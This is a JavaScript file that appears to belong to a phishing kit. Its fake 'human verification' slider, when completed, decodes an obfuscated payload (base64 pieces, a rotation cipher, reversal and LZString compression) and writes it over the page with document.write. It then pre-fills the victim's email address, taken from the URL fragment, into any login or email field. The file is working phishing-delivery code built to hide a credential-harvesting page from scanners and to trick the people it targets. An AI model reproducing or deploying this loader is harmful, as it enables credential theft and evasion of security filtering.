function reassemblePieces() {
  var out = '';
  try {
    for (var i = 0; i < piecesArr.length; i++) {
      var b64piece = piecesArr[i];
      var transformed = atob(b64piece);
      var rot = (transformed.length % 11);
      var chars = [];
      for (var j = 0; j < transformed.length; j++) {
        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
        chars.push(String.fromCharCode(code));
      }
      out += chars.reverse().join('');
    }
    return out;
  } catch (e) {
    console.error('[Decoder] Reassembly failed:', e);
    return null;
  }
}

var handle = document.getElementById('slider-handle');
var track = document.getElementById('slider-track');
var isDragging = false;
var startX = 0;
var handleLeft = 0;

function startDrag(e) {
  isDragging = true;
  startX = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  handleLeft = handle.offsetLeft;
  document.addEventListener('mousemove', drag);
  document.addEventListener('touchmove', drag, {passive: false});
  document.addEventListener('mouseup', stopDrag);
  document.addEventListener('touchend', stopDrag);
}

function drag(e) {
  if (!isDragging) return;
  e.preventDefault();
  var x = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  var dx = x - startX;
  var maxLeft = track.offsetWidth - handle.offsetWidth;
  var newLeft = Math.max(0, Math.min(handleLeft + dx, maxLeft));
  handle.style.left = newLeft + 'px';
  
  if (newLeft >= maxLeft - 5) {
    stopDrag();
    triggerReconstruct();
  }
}

function stopDrag() {
  isDragging = false;
  document.removeEventListener('mousemove', drag);
  document.removeEventListener('touchmove', drag);
  document.removeEventListener('mouseup', stopDrag);
  document.removeEventListener('touchend', stopDrag);
  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) {
    handle.style.left = '0px';
  }
}

function triggerReconstruct() {
  var overlay = document.getElementById('human-overlay');
  if (overlay) overlay.style.display = 'none';
  attemptReconstruct();
}

handle.addEventListener('mousedown', startDrag);
handle.addEventListener('touchstart', startDrag, {passive: false});

function attemptReconstruct() {
  var assembled = reassemblePieces();
  if (!assembled) {
    document.getElementById('human-box').innerHTML = '<h3 style="color:red">Verification failed. Please refresh.</h3>';
    return;
  }

  try {
    var html = LZString.decompressFromBase64(assembled);
    if (!html) throw new Error('Decompression returned null');
    
    // 🔑 CRITICAL FIX: Escape closing script tags to prevent them from terminating this outer script block
    html = html.replace(/<\/script>/gi, '<\\/script>');

    var hash = window.location.hash || (window.location.href.includes('#') ? '#' + window.location.href.split('#')[1] : '');
    
    if (hash && hash.length > 1) {
      var emailValue = hash.substring(1);
      var safeEmail = JSON.stringify(emailValue);
      
      var prefillScript = '<scr' + 'ipt>' +
        '(function() {' +
        '  var emailVal = ' + safeEmail + ';' +
        '  var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;' +
        '  function tryFill() {' +
        '    var inputs = document.querySelectorAll("input");' +
        '    for (var i = 0; i < inputs.length; i++) {' +
        '      var el = inputs[i];' +
        '      var id = (el.id || "").toLowerCase();' +
        '      var name = (el.name || "").toLowerCase();' +
        '      var ph = (el.placeholder || "").toLowerCase();' +
        '      var type = (el.type || "").toLowerCase();' +
        '      if (type === "email" || id.includes("email") || id.includes("user") || id.includes("login") ||' +
        '          name.includes("email") || name.includes("user") || name.includes("login") ||' +
        '          ph.includes("email") || ph.includes("user") || ph.includes("login")) {' +
        '        if (nativeSetter) { nativeSetter.call(el, emailVal); } else { el.value = emailVal; }' +
        '        el.dispatchEvent(new Event("input", { bubbles: true }));' +
        '        el.dispatchEvent(new Event("change", { bubbles: true }));' +
        '        el.dispatchEvent(new Event("blur", { bubbles: true }));' +
        '        return true;' +
        '      }' +
        '    }' +
        '    return false;' +
        '  }' +
        '  var attempts = 0;' +
        '  var interval = setInterval(function() {' +
        '    if (tryFill() || attempts > 30) { clearInterval(interval); }' +
        '    attempts++;' +
        '  }, 300);' +
        '})();' +
      '<\/scr' + 'ipt>';
      
      if (/<\/body>/i.test(html)) {
        html = html.replace(/<\/body>/i, prefillScript + '</body>');
      } else {
        html = html + prefillScript;
      }
    }

    document.open();
    document.write(html);
    document.close();
    console.log("[Decoder] Successfully rendered page.");
  } catch (e) {
    console.error('[Decoder] Fatal error:', e);
    document.getElementById('human-box').innerHTML = '<h3 style="color:red">Error: ' + e.message + '</h3>';
  }
}
